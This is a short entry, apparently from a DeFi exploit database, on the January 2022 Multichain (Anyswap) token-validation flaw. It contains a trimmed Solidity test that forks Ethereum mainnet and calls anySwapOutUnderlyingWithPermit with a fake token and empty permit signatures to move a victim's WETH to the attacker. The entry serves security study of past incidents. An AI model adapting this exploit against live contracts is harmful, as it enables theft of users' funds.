# [?] Multichain (Anyswap) - Insufficient Token Validation

## Summary
Severity: Unknown
Chain: Ethereum
Component: Anyswap
Published: 2022-01-18
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-01/Anyswap_exp.sol
Type: defi-exploit-poc

## Details
```solidity
contract ContractTest is Test {
    address WETH_Address = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    AnyswapV4Router any = AnyswapV4Router(0x6b7a87899490EcE95443e979cA9485CBE7E71522);
    AnyswapV1ERC20 any20 = AnyswapV1ERC20(0x6b7a87899490EcE95443e979cA9485CBE7E71522);
    WETH weth = WETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function setUp() public {
        cheats.createSelectFork("mainnet", 14_037_236); // fork mainnet block number 14037236
    }

    function testExample() public {
        //https://etherscan.io/tx/0xe50ed602bd916fc304d53c4fed236698b71691a95774ff0aeeb74b699c6227f7
        //    anySwapOutUnderlyingWithPermit(
        //     address from,
        //     address token,
        //     address to,
        //     uint amount,
        //     uint deadline,
        //     uint8 v,
        //     bytes32 r,
        //     bytes32 s,
        //     uint toChainID
        //   )
        any.anySwapOutUnderlyingWithPermit(
            0x3Ee505bA316879d246a8fD2b3d7eE63b51B44FAB,
            address(this),
            msg.sender,
            308_636_644_758_370_382_903,
            100_000_000_000_000_000_000,
            0,
            "0x",
            "0x",
            56
        );
        emit log_named_uint("Before exploit, WETH balance of attacker:", weth.balanceOf(msg.sender));
        weth.transfer(msg.sender, 308_636_644_758_370_382_901);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-01/Anyswap_exp.sol_
